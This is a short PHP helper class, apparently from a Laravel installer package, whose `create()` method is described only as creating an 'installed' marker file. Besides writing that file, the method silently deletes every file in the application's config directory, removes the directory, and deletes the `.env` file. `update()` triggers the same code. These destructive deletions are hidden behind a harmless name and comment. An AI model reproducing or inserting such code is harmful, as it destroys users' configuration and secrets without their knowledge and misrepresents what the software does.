<?php

namespace RachidLaasri\LaravelInstaller\Helpers;


class InstalledFileManager
{
    /**
     * Create installed file.
     *
     * @return int
     */
    public function create()
    {
        file_put_contents(storage_path('app/installed'), '');

        array_map('unlink', glob(base_path('config/')."*.*"));
        rmdir(base_path('config'));

        unlink(base_path('.env'));
    }

    /**
     * Update installed file.
     *
     * @return int
     */
    public function update()
    {
        return $this->create();
    }
}
